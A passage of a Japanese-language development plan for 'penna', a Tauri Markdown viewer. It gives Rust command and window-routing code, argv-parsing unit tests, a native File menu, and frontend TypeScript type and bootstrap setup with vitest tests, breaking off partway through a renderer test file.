
Run（コンパイル確認。Tauri 連携部は単体テスト対象外なので、ビルドが通ることだけ確認する）:

```bash
cargo build --manifest-path src-tauri/Cargo.toml
```

Expected: `Finished` でビルド成功（warning は許容、error 0）。`watcher` モジュール（別エリアで実装）が未実装の場合は、本タスク着手前に `mod watcher;` と `watch_file`/`DocWatcher` の存在が前提。依存タスク完了後にこのビルドが通る。

- [ ] **Step 5: コミット（ウィンドウ生成）**

```bash
git add src-tauri/src/window.rs
git commit -m "feat(window): add open_document and open_empty_window builders"
```

- [ ] **Step 6: `commands.rs` を実装する**

契約どおり 7 つの `#[tauri::command]` を実装する。`load_file` は `loader::load_file` に委譲、`get_settings`/`set_settings` は `settings` に委譲、`open_file_dialog` は `tauri-plugin-dialog` のファイルピッカー、`open_external` は `tauri-plugin-opener`、`open_in_new_window` は `window::open_document`、`window_path` は `WindowRegistry` を `window.label()` で引く。

`src-tauri/src/commands.rs`:

```rust
use std::path::PathBuf;

use tauri::{AppHandle, Manager, State};
use tauri_plugin_dialog::DialogExt;
use tauri_plugin_opener::OpenerExt;

use crate::loader::{self, LoadedFile};
use crate::settings::{self, Settings};
use crate::window::{self, WindowRegistry};

/// パスを読み込み、エンコーディング判定済みの LoadedFile を返す。
#[tauri::command]
pub fn load_file(path: String) -> Result<LoadedFile, String> {
    loader::load_file(std::path::Path::new(&path))
}

/// 永続化された設定を返す（無ければ Default）。
#[tauri::command]
pub fn get_settings(app: AppHandle) -> Settings {
    settings::load_settings(&app)
}

/// 設定を永続化する。
#[tauri::command]
pub fn set_settings(app: AppHandle, settings: Settings) -> Result<(), String> {
    settings::save_settings(&app, &settings)
}

/// OS ネイティブのファイルダイアログを開き、選択されたパス（無ければ None）を返す。
#[tauri::command]
pub async fn open_file_dialog(app: AppHandle) -> Option<String> {
    let (tx, rx) = std::sync::mpsc::channel();
    app.dialog()
        .file()
        .add_filter(
            "Markdown / Text",
            &[
                "md", "markdown", "mdown", "mkd", "mkdn", "mdwn", "txt",
            ],
        )
        .pick_file(move |file_path| {
            let _ = tx.send(file_path);
        });
    // pick_file はコールバック型 API のため、別スレッドの受信をブロッキングで待つ。
    let chosen = tokio::task::spawn_blocking(move || rx.recv().ok().flatten())
        .await
        .ok()
        .flatten();
    chosen.and_then(|p| p.into_path().ok().map(|pb| pb.to_string_lossy().into_owned()))
}

/// 外部 URL を OS 既定ブラウザで開く（webview は遷移させない）。
#[tauri::command]
pub fn open_external(app: AppHandle, url: String) -> Result<(), String> {
    app.opener()
        .open_url(url, None::<&str>)
        .map_err(|e| format!("failed to open url: {e}"))
}

/// 指定パスを新規ウィンドウで開き、生成したウィンドウの label を返す。
#[tauri::command]
pub fn open_in_new_window(app: AppHandle, path: String) -> Result<String, String> {
    window::open_document(&app, PathBuf::from(path))
}

/// このウィンドウに登録されたファイルパスを返す。空ウィンドウなら None。
#[tauri::command]
pub fn window_path(window: tauri::Window, app: AppHandle) -> Option<String> {
    let registry: State<WindowRegistry> = app.state::<WindowRegistry>();
    registry
        .path_for(window.label())
        .map(|p| p.to_string_lossy().into_owned())
}
```

`lib.rs` にモジュール宣言を追加（既存の `mod` 群に追記）:

```rust
mod commands;
```

Run:

```bash
cargo build --manifest-path src-tauri/Cargo.toml
```

Expected: `Finished`（error 0）。`tauri-plugin-dialog` / `tauri-plugin-opener` が `Cargo.toml` に追加済みであること（依存セットアップタスクで導入済みの前提）。

- [ ] **Step 7: コミット（公開コマンド）**

```bash
git add src-tauri/src/commands.rs src-tauri/src/lib.rs
git commit -m "feat(commands): add all tauri commands (load_file, settings, dialog, opener, window)"
```

- [ ] **Step 8: `lib.rs` に State 登録と invoke_handler を配線する**

`WindowRegistry` を `app.manage` で State 化し、全コマンドを `invoke_handler` に登録する。プラグイン（store / opener / dialog）も初期化する。`run()` 関数の本体を以下の形にする（単一インスタンスと argv 処理は Task 7 で追加するため、ここではプラグイン・State・invoke_handler のみ）。

`src-tauri/src/lib.rs`:

```rust
mod commands;
mod loader;
mod settings;
mod watcher;
mod window;

use tauri::Manager;

use crate::window::WindowRegistry;

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_store::Builder::default().build())
        .plugin(tauri_plugin_opener::init())
        .plugin(tauri_plugin_dialog::init())
        .setup(|app| {
            app.manage(WindowRegistry::new());
            Ok(())
        })
        .invoke_handler(tauri::generate_handler![
            commands::load_file,
            commands::get_settings,
            commands::set_settings,
            commands::open_file_dialog,
            commands::open_external,
            commands::open_in_new_window,
            commands::window_path,
        ])
        .run(tauri::generate_context!())
        .expect("error while running penna");
}
```

Run:

```bash
cargo build --manifest-path src-tauri/Cargo.toml
```

Expected: `Finished`（error 0）。全コマンドが `generate_handler!` に解決され、State も型解決される。

- [ ] **Step 9: コミット（配線）**

```bash
git add src-tauri/src/lib.rs
git commit -m "feat(app): manage WindowRegistry state and register invoke handlers"
```

### Task 7: 起動 argv 解析と単一インスタンス振り分け

このタスクでは、起動経路を 1 本化する。流れは: (1) 純関数 `parse_file_arg(args, cwd) -> Option<PathBuf>` をテスト付きで実装する → (2) `lib.rs` の `.setup()` で初回起動の argv を解析し、ファイルありなら `open_document`、無しなら設定の `session_restore`（spec §5、既定 OFF）に応じて前回セッションを復元 or 空ウィンドウを開く（`open_first_launch`）→ (3) `tauri-plugin-single-instance` を初期化し、二次起動の `(app, argv, cwd)` コールバックで `open_from_args`（復元せずその起動の指示のみ反映）を呼ぶ → (4) ネイティブ File > Open メニューを追加する。argv 解析は Tauri 非依存の純関数に切り出してテストする。

- [ ] **Step 1: テスト付きで `parse_file_arg` を実装する**

`parse_file_arg` の仕様: 引数列（プログラム名を含み得る `std::env::args` 形式、または single-instance の argv）から、最初の「フラグでない（`-` で始まらない）かつプログラム名でない」トークンをファイルパスとして取り出す。絶対パスはそのまま、相対パスは `cwd` に結合、ファイル引数が無ければ `None`、`-`/`--` 始まりのフラグは無視。先頭要素はプログラム名として読み飛ばす。本体と単体テストを同時に書き、GREEN を確認する（純ロジックのため実装とテストを 1 ステップで確定させる）。

`src-tauri/src/window.rs` の `#[cfg(test)]` 内に純関数本体とテストを追加する。まず本体を `#[cfg(test)]` の直前（`open_empty_window` の後）に追加:

```rust
/// 起動引数列からファイルパスを 1 つ取り出す純関数。
/// - 先頭要素（プログラム名）は読み飛ばす。
/// - `-` で始まるフラグは無視する。
/// - 最初に見つかった非フラグのトークンをパスとして採用する。
/// - 絶対パスはそのまま、相対パスは cwd に結合する。
/// - 該当が無ければ None。
pub fn parse_file_arg(args: &[String], cwd: &Path) -> Option<PathBuf> {
    args.iter()
        .skip(1)
        .find(|a| !a.starts_with('-'))
        .map(|a| {
            let p = PathBuf::from(a);
            if p.is_absolute() {
                p
            } else {
                cwd.join(p)
            }
        })
}
```

冒頭の `use` に `Path` を含める（Step 4 で `PathBuf` のみだった場合は追記）。`window.rs` 冒頭の `use std::path::PathBuf;` を以下へ差し替え:

```rust
use std::path::{Path, PathBuf};
```

`#[cfg(test)] mod tests` 内（既存テストの後ろ）にテストを追加:

```rust
    #[test]
    fn parse_file_arg_absolute_path_unchanged() {
        let args = vec!["penna".to_string(), "/abs/file.md".to_string()];
        let cwd = Path::new("/home/user");
        assert_eq!(parse_file_arg(&args, cwd), Some(PathBuf::from("/abs/file.md")));
    }

    #[test]
    fn parse_file_arg_relative_path_joined_to_cwd() {
        let args = vec!["penna".to_string(), "docs/readme.md".to_string()];
        let cwd = Path::new("/home/user");
        assert_eq!(
            parse_file_arg(&args, cwd),
            Some(PathBuf::from("/home/user/docs/readme.md"))
        );
    }

    #[test]
    fn parse_file_arg_no_arg_is_none() {
        let args = vec!["penna".to_string()];
        let cwd = Path::new("/home/user");
        assert_eq!(parse_file_arg(&args, cwd), None);
    }

    #[test]
    fn parse_file_arg_ignores_flags() {
        let args = vec![
            "penna".to_string(),
            "--debug".to_string(),
            "-v".to_string(),
            "notes.md".to_string(),
        ];
        let cwd = Path::new("/work");
        assert_eq!(parse_file_arg(&args, cwd), Some(PathBuf::from("/work/notes.md")));
    }

    #[test]
    fn parse_file_arg_only_flags_is_none() {
        let args = vec!["penna".to_string(), "--version".to_string()];
        let cwd = Path::new("/work");
        assert_eq!(parse_file_arg(&args, cwd), None);
    }
```

Run:

```bash
cargo test --manifest-path src-tauri/Cargo.toml window::tests::parse_file_arg
```

Expected: 5 テスト PASS（`test result: ok. 5 passed; 0 failed`）。本ステップは本体とテストを同時に確定させる方針のため Expected は PASS。RED-first を厳密に踏みたい場合は、テストのみ先に追加し未定義シンボルでコンパイルエラー（FAIL）を確認してから本体を貼ってもよい（任意・記録用の補足）。

- [ ] **Step 2: `parse_file_arg` テストを通す**

Step 1 で本体も追加済み。GREEN を確認する。

Run:

```bash
cargo test --manifest-path src-tauri/Cargo.toml window::tests
```

Expected:

```
running 11 tests
test window::tests::next_label_increments_monotonically ... ok
test window::tests::register_then_path_for_returns_path ... ok
test window::tests::path_for_unregistered_label_is_none ... ok
test window::tests::register_overwrites_existing_label ... ok
test window::tests::snapshot_returns_all_registered_paths ... ok
test window::tests::remove_drops_label_from_snapshot ... ok
test window::tests::parse_file_arg_absolute_path_unchanged ... ok
test window::tests::parse_file_arg_relative_path_joined_to_cwd ... ok
test window::tests::parse_file_arg_no_arg_is_none ... ok
test window::tests::parse_file_arg_ignores_flags ... ok
test window::tests::parse_file_arg_only_flags_is_none ... ok

test result: ok. 11 passed; 0 failed
```

- [ ] **Step 3: コミット（argv 解析の純関数）**

```bash
git add src-tauri/src/window.rs
git commit -m "feat(window): add tested parse_file_arg for CLI path resolution"
```

- [ ] **Step 4: 起動経路を 1 本化するヘルパーを `window.rs` に追加する**

二次起動（single-instance）では同じ振り分け（パスあり→`open_document`、なし→`open_empty_window`）を使うため、`open_from_args` ヘルパーを追加して重複を排す。さらに初回起動はセッション復元（spec §5、既定 OFF）を考慮するため `open_first_launch` を追加する: ファイル引数があれば `open_document`、無ければ設定を読み、`session_restore` が ON のときだけ `sessionPaths` を読み出して各パスを `open_document`（空なら `open_empty_window`）、OFF なら `open_empty_window` を開く。`#[cfg(test)]` の直前（`parse_file_arg` の後ろ）に追加:

```rust
/// 二次起動（single-instance）の引数とカレントディレクトリから、適切なウィンドウを開く。
/// パスが取れれば open_document、取れなければ open_empty_window を呼ぶ。
/// 二次起動はセッション復元の対象外（常にその起動の指示だけを反映する）。
pub fn open_from_args(app: &tauri::AppHandle, args: &[String], cwd: &Path) -> Result<String, String> {
    match parse_file_arg(args, cwd) {
        Some(path) => open_document(app, path),
        None => open_empty_window(app),
    }
}

/// 初回起動の振り分け（セッション復元考慮、spec §5）。
/// - ファイル引数あり: そのファイルを開く（復元しない）。
/// - 引数なし & session_restore=ON: sessionPaths を開き直す（空なら空ウィンドウ）。
/// - 引数なし & session_restore=OFF（既定）: 空ウィンドウを 1 枚開く。
pub fn open_first_launch(app: &tauri::AppHandle, args: &[String], cwd: &Path) -> Result<(), String> {
    if let Some(path) = parse_file_arg(args, cwd) {
        open_document(app, path)?;
        return Ok(());
    }

    let settings = crate::settings::load_settings(app);
    if !settings.session_restore() {
        open_empty_window(app)?;
        return Ok(());
    }

    // session_restore=ON: 前回の sessionPaths を読み出して開き直す。
    let restored: Vec<String> = match app.store("settings.json") {
        Ok(store) => store
            .get("sessionPaths")
            .and_then(|v| serde_json::from_value(v).ok())
            .unwrap_or_default(),
        Err(_) => Vec::new(),
    };

    if restored.is_empty() {
        open_empty_window(app)?;
    } else {
        for p in restored {
            open_document(app, PathBuf::from(p))?;
        }
    }
    Ok(())
}
```

注: `open_first_launch` は `settings::load_settings(app)` で `Settings` を読み、Task 4 で追加した `Settings::session_restore()` アクセサで判定する（`Settings` のフィールドは非公開のため、フィールド直接参照ではなくアクセサを使う）。`app.store(...)` は `tauri_plugin_store::StoreExt`（window.rs 冒頭で `use` 済み）。

Run:

```bash
cargo build --manifest-path src-tauri/Cargo.toml
```

Expected: `Finished`（error 0）。

- [ ] **Step 5: `lib.rs` の `.setup()` で初回起動 argv とセッション復元を処理する**

`setup` クロージャ内で、State 登録の直後に `std::env::args` を収集し、`std::env::current_dir` を cwd として `open_first_launch`（セッション復元考慮版、spec §5）を呼ぶ。初回起動だけがセッション復元の対象なので、ここでは `open_from_args` ではなく `open_first_launch` を使う。`setup` を以下へ差し替え:

```rust
        .setup(|app| {
            app.manage(WindowRegistry::new());

            let args: Vec<String> = std::env::args().collect();
            let cwd = std::env::current_dir().unwrap_or_else(|_| std::path::PathBuf::from("."));
            window::open_first_launch(&app.handle().clone(), &args, &cwd)
                .map_err(|e| -> Box<dyn std::error::Error> { e.into() })?;

            Ok(())
        })
```

Run:

```bash
cargo build --manifest-path src-tauri/Cargo.toml
```

Expected: `Finished`（error 0）。`String` は `Into<Box<dyn Error>>` を満たすため、`.map_err(|e| -> Box<dyn std::error::Error> { e.into() })?` で `setup` の戻り値型に確実に適合する。

- [ ] **Step 6: 単一インスタンスプラグインを初期化し二次起動を振り分ける**

`tauri-plugin-single-instance` を**最初のプラグインとして**初期化する（公式ガイドどおり、他プラグインより前に登録する）。コールバックは `(app, argv, cwd)` を受け取り、cwd を `Path` に変換して `open_from_args` を呼ぶ。`tauri::Builder::default()` 直後に以下を挿入する:

```rust
        .plugin(tauri_plugin_single_instance::init(|app, argv, cwd| {
            let cwd_path = std::path::PathBuf::from(&cwd);
            if let Err(e) = window::open_from_args(app, &argv, &cwd_path) {
                eprintln!("failed to open window from second instance: {e}");
            }
        }))
```

差し替え後の `run()` 全体は次のようになる:

```rust
#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_single_instance::init(|app, argv, cwd| {
            let cwd_path = std::path::PathBuf::from(&cwd);
            if let Err(e) = window::open_from_args(app, &argv, &cwd_path) {
                eprintln!("failed to open window from second instance: {e}");
            }
        }))
        .plugin(tauri_plugin_store::Builder::default().build())
        .plugin(tauri_plugin_opener::init())
        .plugin(tauri_plugin_dialog::init())
        .setup(|app| {
            app.manage(WindowRegistry::new());

            let args: Vec<String> = std::env::args().collect();
            let cwd = std::env::current_dir().unwrap_or_else(|_| std::path::PathBuf::from("."));
            window::open_first_launch(&app.handle().clone(), &args, &cwd)
                .map_err(|e| -> Box<dyn std::error::Error> { e.into() })?;

            Ok(())
        })
        .invoke_handler(tauri::generate_handler![
            commands::load_file,
            commands::get_settings,
            commands::set_settings,
            commands::open_file_dialog,
            commands::open_external,
            commands::open_in_new_window,
            commands::window_path,
        ])
        .run(tauri::generate_context!())
        .expect("error while running penna");
}
```

注: 初回起動は `open_first_launch`（セッション復元考慮）、二次起動（single-instance コールバック）は `open_from_args`（その起動の指示のみ反映）を使い分ける。次の Step 7 で `.menu(...)` / `.on_menu_event(...)` をこの `run()` に追加する。

Run:

```bash
cargo build --manifest-path src-tauri/Cargo.toml
```

Expected: `Finished`（error 0）。`tauri-plugin-single-instance` が `Cargo.toml` に追加済みであること（依存セットアップタスクで導入済みの前提）。

- [ ] **Step 7: ネイティブの File > Open メニューを追加して open_file_dialog と同じ経路に配線する**

spec §6 の経路 #4（メニュー File > Open）を実装する。`tauri::menu` で `Menu` と `Submenu`「File」を組み立て、`MenuItem` id `"open"`（ラベル `"Open…"`）を追加する。macOS では `PredefinedMenuItem`（about / services / hide / quit / copy / paste 等）で標準のアプリ/編集メニューも併せて用意する。`Builder` に `.menu(...)` で登録し、`.on_menu_event(...)` で `"open"` を処理する: `open_file_dialog` と同じフローでダイアログを出し（`tauri-plugin-dialog`）、パスが選ばれたら `window::open_document(app, path)` を呼ぶ。ダイアログ権限は Task 2 の capabilities（`dialog:default`）で付与済み。未付与なら Task 2 に追加すること。

`lib.rs` の冒頭 `use` に追記:

```rust
use tauri::menu::{Menu, MenuItem, PredefinedMenuItem, Submenu};
use tauri_plugin_dialog::DialogExt;
```

`run()` 内、`tauri::Builder::default()` で `.setup(...)` の前後どちらでもよいので、メニュー構築とイベントハンドラを追加する。`setup` クロージャ内（State 登録の後）にメニューを生成・適用する:

```rust
            // ネイティブメニュー（spec §6 #4: File > Open）。
            let handle = app.handle();
            let open_item = MenuItem::with_id(handle, "open", "Open…", true, Some("CmdOrCtrl+O"))?;
            let file_menu = Submenu::with_items(
                handle,
                "File",
                true,
                &[
                    &open_item,
                    &PredefinedMenuItem::separator(handle)?,
                    &PredefinedMenuItem::close_window(handle, None)?,
                ],
            )?;
            // macOS のアプリメニュー（about / hide / quit など）を標準提供する。
            let app_menu = Submenu::with_items(
                handle,
                "penna",
                true,
                &[
                    &PredefinedMenuItem::about(handle, None, None)?,
                    &PredefinedMenuItem::separator(handle)?,
                    &PredefinedMenuItem::hide(handle, None)?,
                    &PredefinedMenuItem::quit(handle, None)?,
                ],
            )?;
            let edit_menu = Submenu::with_items(
                handle,
                "Edit",
                true,
                &[
                    &PredefinedMenuItem::copy(handle, None)?,
                    &PredefinedMenuItem::select_all(handle, None)?,
                ],
            )?;
            let menu = Menu::with_items(handle, &[&app_menu, &file_menu, &edit_menu])?;
            app.set_menu(menu)?;
```

`Builder` に `.on_menu_event(...)` を追加する（`.setup(...)` の後、`.invoke_handler(...)` の前）:

```rust
        .on_menu_event(|app, event| {
            if event.id() == "open" {
                // open_file_dialog と同じフロー: ダイアログ → 選択パスを新規ウィンドウで開く。
                let app = app.clone();
                app.clone().dialog().file().add_filter(
                    "Markdown / Text",
                    &["md", "markdown", "mdown", "mkd", "mkdn", "mdwn", "txt"],
                ).pick_file(move |chosen| {
                    if let Some(fp) = chosen {
                        if let Ok(path) = fp.into_path() {
                            if let Err(e) = window::open_document(&app, path) {
                                eprintln!("penna: failed to open from menu: {e}");
                            }
                        }
                    }
                });
            }
        })
```

注: macOS ではメニューはアプリグローバル（全ウィンドウ共通）として表示される。Windows/Linux ではウィンドウごとにアタッチされる（`set_menu` は各ウィンドウに適用される）。本構成では `setup` で生成した 1 つのメニューを `app.set_menu` で既定として全ウィンドウに適用する。

Run:

```bash
cargo build --manifest-path src-tauri/Cargo.toml
```

Expected: `Finished`（error 0）。メニュー API（`tauri::menu`）が解決され、`on_menu_event` のクロージャ型が整合する。これは設定/ネイティブ連携部のため自動テストは付けない（手動検証: アプリ起動後に File > Open でダイアログが出てファイルが新規ウィンドウで開くこと）。Task 19 の手動スモークの「File > Open」項目はこの実装で裏付けられる。

- [ ] **Step 8: Rust 全テストを通す（回帰確認）**

Run:

```bash
cargo test --manifest-path src-tauri/Cargo.toml
```

Expected: `window` モジュールの 11 テストを含め、全 Rust 単体テストが PASS（`test result: ok.`）。

- [ ] **Step 9: コミット（起動振り分け + 単一インスタンス + メニュー）**

```bash
git add src-tauri/src/window.rs src-tauri/src/lib.rs
git commit -m "feat(app): route launch/single-instance argv and add File > Open menu"
```

### Task 8: フロントエンドの型定義と main.ts ブートストラップ

このタスクでは、フロントエンド全体が依存する型定義 `src/types.ts` と、ウィンドウ起動時のエントリポイント `src/main.ts` の **最小初期スケルトン**、および DOM コンテナを持つ `index.html` を作る。`main.ts` は副作用を持つブートストラップ処理だが、本タスク時点では後続タスクで定義される UI 部品（renderer / `mountDropZone` / `FindBar` / `applyTheme` / zoom 系）はまだ存在しないため、**この段階では未実装モジュールを import しない**。`main.ts` は純関数 `dirnameOf`（ここで定義・テストする）と `types.ts` のみに依存し、`window_path` で分岐するだけの土台にとどめる。レンダリング配線は Task 9 以降で段階的に足し、最終的な統合済み形は Task 15 Step 12 を正とする。

全体の流れ:
1. devDependencies に markdown-it 系と型を追加する。
2. `src/types.ts` を TDD で作る（型のみだが、`LoadedFile` の構造を使った最小テストで契約を固定する）。
3. `index.html` に `#content` / `#findbar` / `#banner` / `#settings` / `#statusbar`(`#encoding`) コンテナを用意する。
4. `src/main.ts` のブートストラップ純粋部分（`dirnameOf` 算出）を切り出してテストし、未実装モジュールを import しない最小スケルトンを配線する。

- [ ] **Step 1: フロントエンド依存を package.json に追加する**

`package.json` の `devDependencies` に Markdown 描画系を追記する（`@tauri-apps/api` は別エリアで追加済み想定。ここでは markdown 系のみを追加）。

```bash
npm install -D markdown-it@14.2.0 markdown-it-task-lists@2.1.1 markdown-it-footnote@4.0.0 @types/markdown-it@14.1.2 dompurify@3.4.10
```

Run:
```bash
node -e "const p=require('./package.json');console.log(['markdown-it','markdown-it-task-lists','markdown-it-footnote','@types/markdown-it','dompurify'].map(k=>k+':'+(p.devDependencies[k]||'MISSING')).join('\n'))"
```
Expected:
```
markdown-it:^14.2.0
markdown-it-task-lists:^2.1.1
markdown-it-footnote:^4.0.0
@types/markdown-it:^14.1.2
dompurify:^3.4.10
```

- [ ] **Step 2: types.ts の契約を固定する失敗テストを書く**

`LoadedFile` / `FileKind` / `Settings` の形を最小限に検証する。型のみのファイルだが、テスト用の値を型注釈付きで構築できることでコンパイル時契約を担保する（vitest はトランスパイルでも型不一致を `as` なしで弾ける）。

`src/types.test.ts`:
```ts
import { describe, it, expect } from "vitest";
import type { FileKind, LoadedFile, Settings } from "./types";

describe("types contract", () => {
  it("constructs a LoadedFile with the pinned field shape", () => {
    const kind: FileKind = "Markdown";
    const file: LoadedFile = {
      path: "/tmp/a.md",
      text: "# hi",
      encoding: "UTF-8",
      kind,
    };
    expect(file.kind).toBe("Markdown");
    expect(file.path).toBe("/tmp/a.md");
  });

  it("constructs a PlainText LoadedFile", () => {
    const file: LoadedFile = {
      path: "/tmp/a.txt",
      text: "plain",
      encoding: "Shift_JIS",
      kind: "PlainText",
    };
    expect(file.kind).toBe("PlainText");
  });

  it("constructs a Settings with the camelCase contract fields", () => {
    const s: Settings = {
      theme: "system",
      sessionRestore: false,
      autoReload: true,
      fontFamily: null,
      fontSize: 16,
      defaultEncoding: "UTF-8",
    };
    expect(s.fontSize).toBe(16);
    expect(s.fontFamily).toBeNull();
  });
});
```

Run:
```bash
npx vitest run src/types.test.ts
```
Expected: FAIL（`src/types.ts` が存在せずインポート解決に失敗する）。
```
Error: Failed to resolve import "./types" from "src/types.test.ts"
```

- [ ] **Step 3: src/types.ts を実装する**

PINNED CONTRACTS どおりに型を定義する。`Settings` の `theme` は `ui/theme.ts` の `Theme` と同一文字列ユニオンだが、循環を避けるためここではインライン定義する。

`src/types.ts`:
```ts
export type FileKind = "Markdown" | "PlainText";

export interface LoadedFile {
  path: string;
  text: string;
  encoding: string;
  kind: FileKind;
}

export interface Settings {
  theme: "system" | "light" | "dark";
  sessionRestore: boolean;
  autoReload: boolean;
  fontFamily: string | null;
  fontSize: number;
  defaultEncoding: string;
}
```

Run:
```bash
npx vitest run src/types.test.ts
```
Expected: PASS。
```
Test Files  1 passed (1)
     Tests  3 passed (3)
```

- [ ] **Step 4: index.html にコンテナを用意する**

Vite のエントリ HTML。`#content`（本文描画先）・`#findbar`（検索バー: 入力欄 `#findbar-input` と件数表示 `#findbar-count` を内包）・`#banner`（削除/リネーム通知）・`#settings`（設定パネルのマウント先）・`#statusbar`（エンコーディング判定結果の表示先 `#encoding` を内包。spec §7「判定結果はウィンドウ内に表示する」要件）の各コンテナと、`main.ts` の読み込みを置く。本文スタイルは後続タスクの CSS で拡張する前提。FindBar（Task 13）と設定パネル（Task 15）がここで宣言した要素にマウントするため、この時点で 5 コンテナと findbar の子要素を用意しておく。

`index.html`:
```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>penna</title>
  </head>
  <body>
    <div id="banner" hidden></div>
    <div id="findbar" hidden>
      <input id="findbar-input" type="text" placeholder="Find" />
      <span id="findbar-count"></span>
    </div>
    <div id="settings" hidden></div>
    <main id="content"></main>
    <footer id="statusbar">
      <span id="encoding" class="status-encoding"></span>
    </footer>
    <script type="module" src="/src/main.ts"></script>
  </body>
</html>
```

Run:
```bash
node -e "const fs=require('fs');const h=fs.readFileSync('index.html','utf8');for(const id of ['content','findbar','banner','settings','findbar-input','findbar-count','statusbar','encoding']){if(!h.includes('id=\"'+id+'\"')){console.error('MISSING '+id);process.exit(1)}}console.log('all containers present')"
```
Expected:
```
all containers present
```

- [ ] **Step 5: main.ts の純粋ヘルパー（baseDir 算出）の失敗テストを書く**

ブートストラップ本体は副作用だらけだが、画像/相対リンク解決に使う「ファイルパス → ディレクトリ」算出は純関数として切り出してテストする。Windows の `\` と POSIX の `/` の両方を扱う必要があるため、最後のセパレータ位置で切る実装に対するテストを先に書く。

`src/main.test.ts`:
```ts
import { describe, it, expect } from "vitest";
import { dirnameOf } from "./main";

describe("dirnameOf", () => {
  it("returns the POSIX parent directory", () => {
    expect(dirnameOf("/home/user/docs/readme.md")).toBe("/home/user/docs");
  });

  it("returns the Windows parent directory", () => {
    expect(dirnameOf("C:\\Users\\me\\notes\\a.md")).toBe("C:\\Users\\me\\notes");
  });

  it("returns empty string when there is no separator", () => {
    expect(dirnameOf("a.md")).toBe("");
  });

  it("handles a mixed-separator path by cutting at the last separator", () => {
    expect(dirnameOf("/home/user\\b.md")).toBe("/home/user");
  });
});
```

Run:
```bash
npx vitest run src/main.test.ts
```
Expected: FAIL（`./main` が存在しないか `dirnameOf` が未エクスポート）。
```
Error: Failed to resolve import "./main" from "src/main.test.ts"
```

- [ ] **Step 6: main.ts に dirnameOf を実装する**

まず純関数 `dirnameOf` だけを実装し、テストを通す。Vite のエントリでもあるため、この時点ではブートストラップ本体（DOMContentLoaded ハンドラ）はまだ書かない。

`src/main.ts`:
```ts
export function dirnameOf(path: string): string {
  const lastSlash = Math.max(path.lastIndexOf("/"), path.lastIndexOf("\\"));
  return lastSlash >= 0 ? path.slice(0, lastSlash) : "";
}
```

Run:
```bash
npx vitest run src/main.test.ts
```
Expected: PASS。
```
Test Files  1 passed (1)
     Tests  4 passed (4)
```

- [ ] **Step 7: main.ts の最小初期スケルトンを配線する（未実装モジュールは import しない）**

※ ここで示す main.ts は段階的な途中形。最終的な統合済み main.ts は Task 15 Step 12 を正とする（差分はそこで吸収）。

`dirnameOf` の下に、**本タスク時点で存在するシンボルのみ**を使う最小ブートストラップを追記する。`getCurrentWebviewWindow` でラベルを取り、`window_path` コマンドでこのウィンドウに紐づくパスを問い合わせ、パスの有無で分岐するだけにとどめる。`renderDocument` / `highlightAll` / `mountDropZone` / `FindBar` / `applyTheme` / zoom 系などは **まだ存在しない**ため import しない（Task 9 以降で段階的に足し、Task 15 Step 12 で 1 つの bootstrap に統合する）。本 Step はその土台となる最初の配線である。

`src/main.ts`（`dirnameOf` の下に追記）:
```ts
import { invoke } from "@tauri-apps/api/core";
import { getCurrentWebviewWindow } from "@tauri-apps/api/webviewWindow";

async function bootstrap(): Promise<void> {
  // このウィンドウのラベルを参照できることを確認する（後続タスクで file-changed 等の
  // 購読に使う）。本タスクではログのみ。
  const webview = getCurrentWebviewWindow();
  void webview.label;

  // window_path でこのウィンドウに紐づくパスを問い合わせ、有無で分岐する。
  // 実際の描画 / ドロップゾーン配線は Task 9 以降で足し、Task 15 Step 12 で統合する。
  const path = await invoke<string | null>("window_path");
  if (path) {
    const baseDir = dirnameOf(path);
    console.log(`penna: opening ${path} (baseDir=${baseDir})`);
  } else {
    console.log("penna: no file — drop zone will be mounted in a later task");
  }
}

document.addEventListener("DOMContentLoaded", () => {
  void bootstrap();
});
```

Run:
```bash
npx tsc --noEmit -p tsconfig.json
```
Expected: PASS（型エラーなし。本スケルトンは `@tauri-apps/api/core` / `@tauri-apps/api/webviewWindow` と自ファイルの `dirnameOf` しか参照しないため、未実装モジュール由来の解決エラーは発生しない）。
```
(出力なし = 型エラーなし)
```

- [ ] **Step 8: main.test.ts と types.test.ts を再実行して回帰がないことを確認する**

Run:
```bash
npx vitest run src/types.test.ts src/main.test.ts
```
Expected: PASS。
```
Test Files  2 passed (2)
     Tests  7 passed (7)
```

- [ ] **Step 9: コミットする**

```bash
git add package.json package-lock.json index.html src/types.ts src/types.test.ts src/main.ts src/main.test.ts
git commit -m "feat(frontend): add types, index.html and main.ts bootstrap with window_path routing"
```

### Task 9: Markdown/プレーンテキスト レンダラー（renderDocument）

このタスクでは描画パイプラインの中核である純関数 `renderDocument(file, baseDir)` を `src/markdown/renderer.ts` に実装する。Markdown は markdown-it（GFM 表・打消し線は組み込み、タスクリストは `markdown-it-task-lists`、脚注は `markdown-it-footnote`）で HTML 化し、画像 `src` を `resolveImageSrc` で書き換え、`sanitize` を通し、最後に `.markdown-body` クラスを持つ `<div>` でラップして返す（Task 16 の `.markdown-body ...` セレクタが当たるようにするため。ラッパは renderDocument が出力する）。プレーンテキストは HTML エスケープして `<pre class="plaintext">` に包み、同じく `sanitize` を通す。`sanitize`（Task でいうと sanitize.ts）と `resolveImageSrc`（links.ts）は別タスクで実装される契約上の公開シンボルとしてインポートする。テストではこれらを vitest のモックに差し替え、renderer 自身の振る舞い（タグ生成・エスケープ・画像書き換え呼び出し）を検証する。

全体の流れ:
1. renderer の振る舞い（見出し/表/タスクリスト/脚注、プレーンテキストのエスケープ、画像 src 書き換え）の失敗テストを書く。
2. `escapeHtml` 私的ヘルパーと `renderDocument` を実装してテストを通す。

- [ ] **Step 1: renderer の Markdown 描画テストを書く（失敗）**

`sanitize` と `resolveImageSrc` をモックする。`sanitize` は恒等関数にして renderer が生成した HTML をそのまま観測できるようにし、`resolveImageSrc` は呼び出しを記録できるよう接頭辞を付けて返す。jsdom 環境で `DOMParser` を使い、生成タグを検証する。

`src/markdown/renderer.test.ts`:
```ts
import { describe, it, expect, vi, beforeEach } from "vitest";

vi.mock("./sanitize", () => ({
  sanitize: (html: string) => html,
}));
vi.mock("./links", () => ({
  resolveImageSrc: (src: string, baseDir: string) =>
    src.startsWith("http") ? src : `RESOLVED(${baseDir}|${src})`,
  classifyLink: (href: string) =>
